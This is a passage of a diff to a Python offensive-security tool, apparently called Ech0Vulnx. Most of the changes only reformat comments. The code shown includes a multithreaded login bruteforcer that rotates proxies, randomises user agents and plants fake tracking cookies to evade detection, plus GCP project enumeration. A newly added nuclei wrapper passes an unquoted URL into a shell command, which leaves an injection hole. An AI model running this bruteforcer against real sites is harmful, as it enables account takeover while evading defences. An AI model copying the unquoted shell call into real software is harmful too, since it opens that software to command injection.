         if domain.startswith(('http://', 'https://')):
             parsed_url = urlparse(domain)
             domain = parsed_url.netloc
@@ -3579,7 +3598,7 @@ def check_gcp_exposure(domain):
         
         print(f"{Fore.BLUE}[*] Checking for GCP resource exposure for {domain}{Style.RESET_ALL}")
         
-        # --> Check for common GCP project naming patterns
+        # Check for common GCP project naming patterns
         project_patterns = [
             f"{domain.split('.')[0]}-project",
             f"{domain.split('.')[0]}-prod",
@@ -3634,7 +3653,7 @@ def check_gcp_project(pattern):
     except requests.exceptions.Timeout:
         print(f"{Fore.YELLOW}[!] Timeout while checking project: {pattern}{Style.RESET_ALL}")
     except requests.exceptions.RequestException:
-        pass  # --> Silently ignore connection errors for non-existent projects
+        pass  # Silently ignore connection errors for non-existent projects
     except Exception as e:
         print(f"{Fore.RED}[!] Error checking project {pattern}: {str(e)}{Style.RESET_ALL}")
 
@@ -3644,39 +3663,39 @@ if args.gcp_scan:
     check_gcp_exposure(args.gcp_scan)
 
 
-# --> Bruteforcing username and password input fields
+# Bruteforcing username and password input fields
 
 def test_proxy(proxy, test_url="https://www.google.com", timeout=3):
     """Test if a proxy works with both HTTP and HTTPS - optimized for speed"""
     try:
-        #  --> Reduce timeout for faster testing
+        # Reduce timeout for faster testing
         if proxy.startswith('http'):
             proxies = {'http': proxy, 'https': proxy}
         else:
             proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
             
-        # --> Use HEAD request instead of GET for faster response
+        # Use HEAD request instead of GET for faster response
         response = requests.head(
             test_url, 
             proxies=proxies, 
             timeout=timeout,
-            # --> Don't verify SSL to speed up connection
+            # Don't verify SSL to speed up connection
             verify=False,
-            # --> Don't follow redirects to save time
+            # Don't follow redirects to save time
             allow_redirects=False
         )
         
-        # --> Accept any 2xx, 3xx status code as success
+        # Accept any 2xx, 3xx status code as success
         if 200 <= response.status_code < 400:
             return True
     except Exception:
-        # --> If that fails, try with explicit HTTP for HTTPS
+        # If that fails, try with explicit HTTP for HTTPS
         try:
             if not proxy.startswith('http'):
                 proxy = f'http://{proxy}'
             proxies = {'http': proxy, 'https': proxy}
             
-            # --> Use HEAD request for speed
+            # Use HEAD request for speed
             response = requests.head(
                 test_url, 
                 proxies=proxies, 
@@ -3735,11 +3754,11 @@ def load_proxies(proxy_file=None, test=True, max_workers=50):
             
             return result
         
-        # --> Use ThreadPoolExecutor for parallel testing
+        # Use ThreadPoolExecutor for parallel testing
         with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
             futures = {executor.submit(test_proxy_task, proxy): proxy for proxy in proxies}
             
-            # --> Wait for all futures to complete
+            # Wait for all futures to complete
             concurrent.futures.wait(futures)
         
         if has_tqdm:
@@ -3756,7 +3775,7 @@ def get_random_user_agent():
         ua = UserAgent()
         return ua.random
     except:
-        # --> Fallback user agents if fake_useragent fails
+        # Fallback user agents if fake_useragent fails
         user_agents = [
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
             'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
@@ -3780,10 +3799,10 @@ def username_wordlist(file: str) -> list:
 
 def randomize_cookies(base_cookies=None):
     """Generate randomized cookies"""
-    # --> Start with required cookies or empty dict
+    # Start with required cookies or empty dict
     cookies = base_cookies.copy() if base_cookies else {}
     
-    # --> Add random tracking-like cookies
+    # Add random tracking-like cookies
     random_cookies = {
         f"_ga_{random.randint(1000, 9999)}": f"{uuid.uuid4()}",
         f"visitor_id{random.randint(100, 999)}": f"{random.randint(10000, 999999)}",
@@ -3791,9 +3810,9 @@ def randomize_cookies(base_cookies=None):
         "last_visit": str(int(time.time()) - random.randint(3600, 86400))
     }
     
-    # --> Randomly select some of these cookies
+    # Randomly select some of these cookies
     for k, v in random_cookies.items():
-        if random.random() > 0.6:  # --> 40% chance to include each cookie
+        if random.random() > 0.6:  # 40% chance to include each cookie
             cookies[k] = v
             
     return cookies
@@ -3804,11 +3823,11 @@ def detect_2fa(response_text, response_url):
     Detect if the response indicates a 2FA challenge
     Returns True if 2FA is detected, False otherwise
     """
-    # --> Convert to lowercase for case-insensitive matching
+    # Convert to lowercase for case-insensitive matching
     text_lower = response_text.lower()
     url_lower = response_url.lower()
     
-    # --> Common 2FA indicators in response text
+    # Common 2FA indicators in response text
     text_indicators = [
         'two-factor', 'two factor', '2fa', 'second factor', 
         'verification code', 'security code', 'authenticator app',
@@ -3821,27 +3840,27 @@ def detect_2fa(response_text, response_url):
         'Authentication code'
     ]
     
-    # --> Common 2FA indicators in URL
+    # Common 2FA indicators in URL
     url_indicators = [
         '2fa', 'two-factor', 'twofactor', 'mfa', 'otp', 
         'verification', 'verify', 'authenticator', 'security-code',
         'second-step', 'second_step', 'challenge', 'sms'
     ]
     
-    # --> Check for 2FA indicators in response text
+    # Check for 2FA indicators in response text
     for indicator in text_indicators:
         if indicator in text_lower:
             return True
     
-    # --> Check for 2FA indicators in URL
+    # Check for 2FA indicators in URL
     for indicator in url_indicators:
         if indicator in url_lower:
             return True
     
-    # --> Check for input fields that might indicate 2FA
+    # Check for input fields that might indicate 2FA
     soup = BeautifulSoup(response_text, 'html.parser')
     
-    # -->  Look for verification code input fields
+    # Look for verification code input fields
     code_inputs = soup.find_all('input', {
         'type': ['text', 'number', 'tel'],
         'name': lambda x: x and any(term in x.lower() for term in [
@@ -3852,7 +3871,7 @@ def detect_2fa(response_text, response_url):
     if code_inputs:
         return True
     
-    # --> Look for 2FA-related form labels or text
+    # Look for 2FA-related form labels or text
     labels = soup.find_all(['label', 'div', 'p', 'h1', 'h2', 'h3', 'h4', 'span'])
     for label in labels:
         if label.text and any(term in label.text.lower() for term in text_indicators):
@@ -3863,10 +3882,10 @@ def detect_2fa(response_text, response_url):
 def try_login_task(username, password, url, form_data, initial_url, success_indicators, verbose, proxy=None, user_agent=None, username_field=None, password_field=None):
     """Helper function for threaded login attempts with proxy and user agent support"""
     try:
-        # --> Set up headers with random user agent
+        # Set up headers with random user agent
         headers = {'User-Agent': user_agent or get_random_user_agent()}
         
-        # --> Set up proxy if provided
+        # Set up proxy if provided
         proxies = None
         if proxy:
             if proxy.startswith('http'):
@@ -3874,15 +3893,15 @@ def try_login_task(username, password, url, form_data, initial_url, success_indi
             else:
                 proxies = {'http': f'http://{proxy}', 'https': f'https://{proxy}'}
         
-        # --> Add a small random delay to further avoid detection
+        # Add a small random delay to further avoid detection
         time.sleep(random.uniform(0.1, 0.5))
 
-        # --> Add random cookies technique, Makes requests appear to come from real browsers with history
+        # Add random cookies technique, Makes requests appear to come from real browsers with history
         cookies = randomize_cookies()
         session = requests.Session()
         session.cookies.update(cookies)
         
-        # --> Make the request with proxy and custom headers
+        # Make the request with proxy and custom headers
         response = session.post(
             url, 
             data=form_data, 
@@ -3890,43 +3909,44 @@ def try_login_task(username, password, url, form_data, initial_url, success_indi
             proxies=proxies,
             allow_redirects=True,
             cookies=cookies,
-            timeout=10  # --> Increased timeout for proxy connections
+            timeout=10  # Increased timeout for proxy connections
         )
         
         response_text_lower = response.text.lower()
-        
-        # -->  Check for 2FA before proceeding
+
+        print_lock = threading.Lock()
+        # Check for 2FA before proceeding
         if detect_2fa(response.text, response.url):
-            # --> Use print_lock to avoid garbled output in multithreaded context
+            # Use print_lock to avoid garbled output in multithreaded context
             with print_lock:
                 print(f"\n{Fore.YELLOW}[!] 2FA/MFA detected after login attempt with username: {Fore.MAGENTA}{username}{Style.RESET_ALL}")
                 print(f"{Fore.YELLOW}[!] Password may be correct, but 2FA is preventing access{Style.RESET_ALL}")
                 print(f"{Fore.YELLOW}[!] Bruteforcing halted as 2FA cannot be automatically bypassed{Style.RESET_ALL}")
                 
-                # --> If verbose, provide more details
+                # If verbose, provide more details
                 if verbose:
                     print(f"{Fore.WHITE}[*] Response URL: {Fore.GREEN}{response.url}{Style.RESET_ALL}")
                     print(f"{Fore.WHITE}[*] Potential valid credentials: {Fore.MAGENTA}{username} : {password}{Style.RESET_ALL}")
                 
-                # --> Return a special value to indicate 2FA was detected
+                # Return a special value to indicate 2FA was detected
                 return ("2FA_DETECTED", username, password, response.url)
         
-        # --> Quick check for obvious failures
+        # Quick check for obvious failures
         if any(neg in response_text_lower for neg in success_indicators['negative']):
             return None
             
         success = False
         
-        # --> Check 1: URL change
+        # Check 1: URL change
         if response.url != initial_url:
             if any(indicator in response.url.lower() for indicator in success_indicators['url_change']):
                 success = True
         
-        # --> Check 2: Content check
+        # Check 2: Content check
         if any(indicator in response_text_lower for indicator in success_indicators['content']):
             success = True
             
-        # --> Check 3: Redirect check
+        # Check 3: Redirect check
         if response.history and response.url != url and 'login' not in response.url.lower():
             success = True
             
@@ -3935,7 +3955,7 @@ def try_login_task(username, password, url, form_data, initial_url, success_indi
     
     except requests.exceptions.ProxyError as e:
         if verbose:
-            # --> If it's an HTTP/HTTPS mismatch, provide more specific information
+            # If it's an HTTP/HTTPS mismatch, provide more specific information
             if "Your proxy appears to only use HTTP and not HTTPS" in str(e):
                pass
     except requests.exceptions.RequestException as e:
@@ -3948,7 +3968,7 @@ def try_login_task(username, password, url, form_data, initial_url, success_indi
 
 def bruteforce_login(url, username_file, password_file, proxy_file=None, verbose=False):
     try:
-        # --> Validate input files first
+        # Validate input files first
         if not username_file or not password_file:
             print(f"{Fore.RED}[!] Both username and password wordlists are required{Style.RESET_ALL}")
             return
@@ -3961,14 +3981,14 @@ def bruteforce_login(url, username_file, password_file, proxy_file=None, verbose
             print(f"{Fore.RED}[!] Password wordlist not found: {password_file}{Style.RESET_ALL}")
             return
 
-        # --> Parse the target URL
+        # Parse the target URL
         parsed_url = urlparse(url)
         base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
         path = parsed_url.path
         
         print(f"{Fore.WHITE}[*] Testing login form at {Fore.GREEN}{url}{Style.RESET_ALL}")
         
-        # --> Check if the target URL is accessible
+        # Check if the target URL is accessible
         try:
             response = requests.get(url, timeout=10)
             response.raise_for_status()
@@ -3979,7 +3999,7 @@ def bruteforce_login(url, username_file, password_file, proxy_file=None, verbose
             print(f"{Fore.RED}[!] Could not access {url}: {str(e)}{Style.RESET_ALL}")
             return
         
-        # --> Check if the target URL has a login form
+        # Check if the target URL has a login form
         soup = BeautifulSoup(response.text, 'html.parser')
         form = soup.find('form')
         if not form:
@@ -3990,13 +4010,13 @@ def bruteforce_login(url, username_file, password_file, proxy_file=None, verbose
             print(f"{Fore.WHITE}[*] Found login form with action: {Fore.MAGENTA}{form.get('action', 'default')}{Style.RESET_ALL}")
             print(f"{Fore.WHITE}[*] Form method: {Fore.MAGENTA}{form.get('method', 'POST')}{Style.RESET_ALL}")
         
-        # --> Find all input fields in the login form
+        # Find all input fields in the login form
         input_fields = form.find_all('input')
         if not input_fields:
             print(f"{Fore.YELLOW}[!] No input fields found in form on {url}{Style.RESET_ALL}")
             return
         
-        # --> Create a dictionary of input field names and values
+        # Create a dictionary of input field names and values
         input_data = {}
         for field in input_fields:
             name = field.get('name')
@@ -4005,7 +4025,7 @@ def bruteforce_login(url, username_file, password_file, proxy_file=None, verbose
                 if verbose:
                     print(f"{Fore.WHITE}[*] Found form field: {Fore.MAGENTA}{name} (type: {field.get('type', 'text')}){Style.RESET_ALL}")
 
-        # --> Create a dictionary of username and password input fields
+        # Create a dictionary of username and password input fields
         username_field = None
         password_field = None
         
@@ -4038,7 +4058,7 @@ def bruteforce_login(url, username_file, password_file, proxy_file=None, verbose
             
         print(f"{Fore.WHITE}[*] Found login form fields - Username: {Fore.MAGENTA}{username_field}, {Fore.WHITE}Password: {Fore.MAGENTA}{password_field}{Style.RESET_ALL}")
         
-        # --> Load wordlists
+        # Load wordlists
         try:
             usernames = password_wordlist(username_file)
             passwords = password_wordlist(password_file)
@@ -4048,7 +4068,7 @@ def bruteforce_login(url, username_file, password_file, proxy_file=None, verbose
             print(f"{Fore.RED}[!] Error loading wordlists: {str(e)}{Style.RESET_ALL}")
             return
 
-        # --> Load and test proxies ONCE at the beginning
+        # Load and test proxies ONCE at the beginning
         proxies = load_proxies(proxy_file, test=True, max_workers=50) if proxy_file else []
         proxy_cycle = cycle(proxies) if proxies else None
         
@@ -4087,25 +4107,25 @@ def bruteforce_login(url, username_file, password_file, proxy_file=None, verbose
             ]
         }
         
-        # --> Get initial state
+        # Get initial state
         initial_url = response.url
         if verbose:
             print(f"{Fore.WHITE}[*] Initial URL: {Fore.GREEN}{initial_url}{Style.RESET_ALL}")
         
-        # --> Set up progress tracking
+        # Set up progress tracking
         total_combinations = len(usernames) * len(passwords)
         print(f"{Fore.WHITE}[*] Starting bruteforce with {Fore.MAGENTA}{total_combinations} combinations{Style.RESET_ALL}")
         
-        # --> Use ThreadPoolExecutor for faster performance
+        # Use ThreadPoolExecutor for faster performance
         max_workers = min(50, os.cpu_count() * 5)  # Adjust based on your system
         print(f"{Fore.WHITE}[*] Using {Fore.MAGENTA}{max_workers} concurrent workers{Style.RESET_ALL}")
         
-        # --> Create a counter for progress tracking
+        # Create a counter for progress tracking
         completed = 0
         found_credentials = False
         print_lock = threading.Lock()
         
-        # --> Try to import tqdm for progress bar
+        # Try to import tqdm for progress bar
         try:
             from tqdm import tqdm
             progress_bar = tqdm(total=total_combinations, desc="Testing combinations", 
@@ -4116,7 +4136,7 @@ def bruteforce_login(url, username_file, password_file, proxy_file=None, verbose
             has_tqdm = False
             print(f"{Fore.WHITE}[*] tqdm not installed, using simple progress updates{Style.RESET_ALL}")
         
-        # --> Function to update progress
+        # Function to update progress
         def update_progress():
             nonlocal completed
             completed += 1
@@ -4125,39 +4145,39 @@ def bruteforce_login(url, username_file, password_file, proxy_file=None, verbose
             elif completed % 10 == 0:
                 print(f"{Fore.WHITE}[*] Progress: {Fore.MAGENTA}{completed}/{total_combinations} ({(completed/total_combinations)*100:.1f}%){Style.RESET_ALL}", end='\r')
         
-        # --> Function to process a single login attempt
+        # Function to process a single login attempt
         def process_login(username, password):
             nonlocal found_credentials, proxy_cycle
             
-            # --> Skip if we already found credentials
+            # Skip if we already found credentials
             if found_credentials:
                 return None
                 
-            # --> Create form data for this attempt
+            # Create form data for this attempt
             form_data = input_data.copy()
             form_data[username_field] = username.strip()
             form_data[password_field] = password.strip()
             
-            # --> Get a random user agent
+            # Get a random user agent
             user_agent = get_random_user_agent()
             
-            # --> Get a proxy if available - use the existing proxy_cycle
+            # Get a proxy if available - use the existing proxy_cycle
             proxy = next(proxy_cycle) if proxy_cycle else None
             
-            # --> Try login with proxy and user agent
+            # Try login with proxy and user agent
             result = try_login_task(username, password, url, form_data, initial_url, 
                                    success_indicators, verbose, proxy, user_agent,
-                                   username_field, password_field)  # --> Pass the field names
+                                   username_field, password_field)  # Pass the field names
             
-            # --> Update progress
+            # Update progress
             with print_lock:
                 update_progress()
                 
-            # --> Check if we found valid credentials or detected 2FA
+            # Check if we found valid credentials or detected 2FA
             if result:
                 if isinstance(result, tuple) and len(result) >= 3:
                     if result[0] == "2FA_DETECTED":
-                        # --> 2FA was detected, handle specially
+                        # 2FA was detected, handle specially
                         _, username, password, final_url = result
                         with print_lock:
                             if has_tqdm:
@@ -4166,7 +4186,7 @@ def bruteforce_login(url, username_file, password_file, proxy_file=None, verbose
                             print(f"{Fore.WHITE}[+] Final URL: {Fore.GREEN}{final_url}{Style.RESET_ALL}")
                             print(f"{Fore.YELLOW}[!] Bruteforcing stopped as 2FA cannot be automatically bypassed{Style.RESET_ALL}")
                     else:
-                        # --> Normal successful login
+                        # Normal successful login
                         username, password, final_url = result
                         with print_lock:
                             if has_tqdm:
@@ -4179,13 +4199,13 @@ def bruteforce_login(url, username_file, password_file, proxy_file=None, verbose
                 
             return None
         
-        # --> Create all work items
+        # Create all work items
         work_items = []
         for username in usernames:
             for password in passwords:
                 work_items.append((username, password))
         
-        # --> Process in batches
+        # Process in batches
         batch_size = 1000
         for i in range(0, len(work_items), batch_size):
             if found_credentials:
@@ -4204,7 +4224,7 @@ def bruteforce_login(url, username_file, password_file, proxy_file=None, verbose
                     try:
                         result = future.result()
                         if result:
-                            # --> We found valid credentials or detected 2FA
+                            # We found valid credentials or detected 2FA
                             executor.shutdown(wait=False, cancel_futures=True)
                             break
                     except Exception as e:
@@ -4212,7 +4232,7 @@ def bruteforce_login(url, username_file, password_file, proxy_file=None, verbose
                             with print_lock:
                                 print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
         
-        # --> Close progress bar if it exists
+        # Close progress bar if it exists
         if has_tqdm and progress_bar and not found_credentials:
             progress_bar.close()
         
@@ -4225,7 +4245,7 @@ def bruteforce_login(url, username_file, password_file, proxy_file=None, verbose
             import traceback
             traceback.print_exc()
 
-# --> Update the argument handling
+# Update the argument handling
 if args.brute_user_pass:
     if not args.username_wordlist:
         print(f"{Fore.RED}[!] Error: Username wordlist is required. Use --username-wordlist to specify the file{Style.RESET_ALL}")
@@ -4234,3 +4254,74 @@ if args.brute_user_pass:
     else:
         bruteforce_login(args.brute_user_pass, args.username_wordlist, args.password_wordlist, 
                             proxy_file=args.proxy_file, verbose=args.verbose)
+
+if args.nuclei:
+    def nuclei_scan(template: str, url: str) -> str:
+        print(f"Scanning {Fore.GREEN}{url} {Fore.WHITE}with {Fore.MAGENTA}{template}{Fore.WHITE}..\n")
+        nuclei_output = sub_output.subpro_scan(f"nuclei -u {url} -t {template} -silent -c 20 -j -o vulnerable.json")
+        return nuclei_output
+    
+    def nuclei_parser(nuclei_output: str) -> str:
+        try:
+            with open("vulnerable.json", "r") as f:
+                data = [x.strip() for x in f.readlines()]
+            
+            if not data:
+                print(f"{Fore.YELLOW}No vulnerabilities found.{Fore.WHITE}")
+                return
+                
+            results = []
+            for data_item in data:
+                try:
+                    json_result = json.loads(data_item)
+                    
+                    template_id = json_result.get("template-id", "N/A")
+                    matched_at = json_result.get("matched-at", "N/A")
+                    info = json_result.get("info", {})
+                    
+                    name = info.get("name", "Unknown Vulnerability")
+                    description = info.get("description", "No description available")
+                    severity = info.get("severity", "unknown")
+                    
+                    # Print findings
+                    print(f"{Fore.MAGENTA}Template ID: {Fore.GREEN}{template_id}")
+                    print(f"{Fore.MAGENTA}PoC: {Fore.GREEN}{matched_at}")
+                    print(f"{Fore.MAGENTA}Vulnerability: {Fore.GREEN}{name}")
+                    print(f"{Fore.MAGENTA}Description: {Fore.GREEN}{description}")
+                    print(f"{Fore.MAGENTA}Severity: {Fore.RED}{severity}")
+                    print("-" * 60)
+                    
+                    # Append to results
+                    results.append({
+                        "template_id": template_id,
+                        "matched_at": matched_at,
+                        "name": name,
+                        "description": description,
+                        "severity": severity
+                    })
+                except json.JSONDecodeError as e:
+                    print(f"{Fore.RED}Error parsing JSON result: {e}{Fore.WHITE}")
+                    continue
+                
+            return results
+        except FileNotFoundError:
+            print(f"{Fore.RED}Error: vulnerable.json file not found. Nuclei scan may have failed.{Fore.WHITE}")
+            return []
+        except Exception as e:
+            print(f"{Fore.RED}Error processing nuclei output: {str(e)}{Fore.WHITE}")
+            return []
+    
+    def main():
+        template = args.nuclei_template
+        url = args.nuclei
+        if not template or not url:
+            print(f"{Fore.RED}Error: Both template and URL are required for nuclei scanning.{Fore.WHITE}")
+            print(f"Usage: python Ech0Vulnx.py --nuclei [URL] --nuclei-template [TEMPLATE_PATH]")
+            return
+            
+        results = nuclei_scan(template, url)
+        nuclei_parser(results)
+    
+    if __name__ == "__main__":
+        main()
+        
